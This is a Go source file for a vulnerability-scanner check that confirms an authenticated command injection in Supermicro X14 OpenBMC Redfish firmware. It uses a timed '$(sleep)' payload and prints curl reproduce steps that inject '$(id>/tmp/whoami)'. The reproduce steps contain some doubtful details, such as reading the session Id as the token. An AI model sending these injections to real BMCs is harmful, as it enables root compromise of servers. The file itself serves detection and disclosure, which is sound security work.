package check

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/redfish"
)

// Supermicro X14 runs Phosphor OpenBMC with SMC's bmcweb fork, whose Redfish
// SubmitTestEvent handler concatenates request JSON straight into a system()
// call with only bare double-quote wrapping; bmcweb runs as root, so a
// ConfigureManager request with a quote or command substitution breaks out to
// root execution (upstream OpenBMC publishes over D-Bus and never shells out,
// so the bug is fork-specific; kb/smc/notes/). The check confirms it with a
// time-based oracle: a control event vs. one running `sleep`, comparing
// reply latency. It requires credentials, online mode, and both the
// Supermicro identity and an OpenBMC service root, so it never POSTs at a
// generic OpenBMC box or an ATEN-era SMC; without a measured delay it reports
// nothing.
func init() {
	Register(Check{
		Name:          "http.redfish.smc.x14.submitTestEvent",
		Description:   "Supermicro X14 (OpenBMC) redfish-core-smci SubmitTestEvent OEM command injection, actively confirmed via a time-based oracle",
		Category:      "vuln",
		Applies:       Applicability{CrossVendor: true},
		Authenticated: true, // post-auth (ConfigureManager); needs a credential to reach the handler
		Enabled:       true,
		Run:           runSMCX14EventRCE,
	})
}

// smcSleepSecs is the injected sleep duration for the time-based oracle: long
// enough to clear network jitter, short enough to stay quick.
const smcSleepSecs = 6

func runSMCX14EventRCE(ctx context.Context, t *engine.Target) []engine.Finding {
	// Confirming the injection runs a bounded sleep command without changing
	// persistent state. It still requires a credential and online mode.
	if t.DisableLogins || t.Cred.User == "" {
		return nil
	}
	port := webPort(t)

	// Confirm the SMC-OpenBMC (X14-class) fork before sending anything, so the
	// injection is never POSTed at an unrelated box.
	r, err := redfish.ProbeAt(t.Host, port, min(t.Timeout, 4*time.Second))
	if err != nil || r == nil || r.Status == 0 {
		return nil
	}
	if smc, openbmc := classifySMCOpenBMC(r, identityVendor(t)); !smc || !openbmc {
		return nil
	}

	// The handler shells event fields into system("/usr/bin/smci-msg-sender \"...\"")
	// as root; $(...) executes inside the double-quoted argument. Send a control
	// event and an injected `sleep` event and compare latency.
	client := redfish.InsecureClient(time.Duration(smcSleepSecs)*time.Second + 8*time.Second)
	base := redfish.BaseURL(t.Host, port)

	sess := redfish.OpenSession(client, base, t.Cred.User, t.Cred.Pass, min(t.Timeout, 6*time.Second))
	if !sess.Authenticated {
		return nil // no ConfigureManager session -> cannot reach the handler
	}
	if sess.SessionURI != "" {
		defer redfish.DeleteSession(client, base, sess.SessionURI, sess.Token, 4*time.Second)
	}
	actionURL := base + "/redfish/v1/EventService/Actions/EventService.SubmitTestEvent"

	ctrl, okc := smcTimeSubmitEvent(ctx, client, actionURL, sess, t.Cred, "oobscan-control")
	inj, oki := smcTimeSubmitEvent(ctx, client, actionURL, sess, t.Cred, "$(sleep "+strconv.Itoa(smcSleepSecs)+")")
	if !okc || !oki {
		return nil // could not complete the request pair; do not guess
	}
	// A vulnerable host runs `sleep smcSleepSecs`, so the injected reply is ~that
	// much slower than the control. Require most of the sleep to show up (jitter
	// margin); a merely-slow BMC delays both requests, so the delta stays small.
	if inj-ctrl < time.Duration(smcSleepSecs-2)*time.Second {
		return nil
	}
	return []engine.Finding{{
		Check: "http.redfish.smc.x14.submitTestEvent", Category: "vuln", Risk: "critical",
		Port: port, Transport: "tcp", Protocol: "redfish",
		Fields: engine.F(
			"user", t.Cred.User,
			"proof", proofKV(
				"path", "/redfish/v1/EventService/Actions/EventService.SubmitTestEvent",
				"sleepSeconds", strconv.Itoa(smcSleepSecs),
				"injectSeconds", fmt.Sprintf("%.1f", inj.Seconds()),
				"controlSeconds", fmt.Sprintf("%.1f", ctrl.Seconds()),
				"deltaSeconds", fmt.Sprintf("%.1f", (inj-ctrl).Seconds()))),
	}}
}

// smcTimeSubmitEvent POSTs one SubmitTestEvent whose shelled-out fields carry the
// payload and returns the round-trip time. The payload goes in Message +
// MessageArgs (the free-form fields the redfish-core-smci fork concatenates into
// system()); MessageId stays a valid registry id so parsing reaches the sink.
func smcTimeSubmitEvent(ctx context.Context, client *http.Client, url string, sess redfish.SessionResult, cred engine.Cred, payload string) (time.Duration, bool) {
	body, _ := json.Marshal(map[string]any{
		"MessageId":         "Alert.1.0.LanDisconnect",
		"EventType":         "Alert",
		"EventId":           "1",
		"Severity":          "OK",
		"Message":           payload,
		"MessageArgs":       []string{payload},
		"OriginOfCondition": "/redfish/v1/Systems/1",
	})
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return 0, false
	}
	req.Header.Set("Content-Type", "application/json")
	if sess.Token != "" {
		req.Header.Set("X-Auth-Token", sess.Token)
	} else { // basic-auth fallback when no session token was minted
		req.SetBasicAuth(cred.User, cred.Pass)
	}
	start := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return 0, false
	}
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	_ = resp.Body.Close()
	return time.Since(start), true
}

// classifySMCOpenBMC decides, from unauth signals, whether a host is a
// Supermicro box and an OpenBMC box -- the pair that identifies the vulnerable
// X14 redfish-core-smci fork. Both must hold; a generic OpenBMC unit (upstream,
// not vulnerable) or an ATEN-era Supermicro (no OpenBMC) is excluded.
func classifySMCOpenBMC(r *redfish.Result, vendorSlug string) (smc, openbmc bool) {
	raw := bytes.ToLower(r.RawRoot)
	// Supermicro signal: resolved vendor, an Oem.Supermicro block in the service
	// root, or a "supermicro" marker anywhere in the root body.
	if strings.EqualFold(vendorSlug, "supermicro") {
		smc = true
	}
	if r.ServiceRoot != nil && len(r.ServiceRoot.Oem.Supermicro) > 0 {
		smc = true
	}
	if bytes.Contains(raw, []byte("supermicro")) || bytes.Contains(raw, []byte("smci")) {
		smc = true
	}
	// OpenBMC signal: resolved vendor, OpenBMC markers in the root, the bmcweb
	// manager id "/managers/bmc", or an OpenBMC web title.
	if strings.EqualFold(vendorSlug, "openbmc") {
		openbmc = true
	}
	if bytes.Contains(raw, []byte("openbmc")) || bytes.Contains(raw, []byte("/managers/bmc")) {
		openbmc = true
	}
	return smc, openbmc
}

func init() {
	RegisterExplain("http.redfish.smc.x14.submitTestEvent", explainSMCX14EventRCE)
}

func explainSMCX14EventRCE(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 443)
	user := explainField(f, "user")
	proof := explainField(f, "proof")
	baseURL := explainBaseURL(host, f, port, "https")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nSupermicro X14 (OpenBMC fork `redfish-core-smci`) concatenates SubmitTestEvent\n")
	b.WriteString("request fields directly into `system()` as root. A `$(cmd)` payload executes\n")
	b.WriteString("on the BMC -- confirmed here via a time-based sleep oracle.\n")
	if proof != "" {
		b.WriteString(fmt.Sprintf("\n**Proof:** `%s`\n", proof))
	}
	b.WriteString("\n**Reproduce (requires a ConfigureManager credential):**\n")
	b.WriteString(explainSh(
		"# Step 1: open a Redfish session",
		fmt.Sprintf(`TOKEN=$(curl -sk -X POST %s/redfish/v1/SessionService/Sessions \`, baseURL),
		`  -H "Content-Type: application/json" \`,
		fmt.Sprintf(`  -d '{"UserName":"%s","Password":"<password>"}' \`, user),
		`  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('Id',''))")`,
		"",
		"# Step 2: inject a command",
		fmt.Sprintf(`curl -sk -X POST %s/redfish/v1/EventService/Actions/EventService.SubmitTestEvent \`, baseURL),
		`  -H "Content-Type: application/json" -H "X-Auth-Token: $TOKEN" \`,
		`  -d '{"EventType":"Alert","MessageId":"iDRAC.1.6.AMP0300","Message":"$(id>/tmp/whoami)","MessageArgs":["x"]}'`,
	))
	b.WriteString("\n\n**Impact:** Authenticated root command execution on the BMC OS.\n")
	return b.String()
}
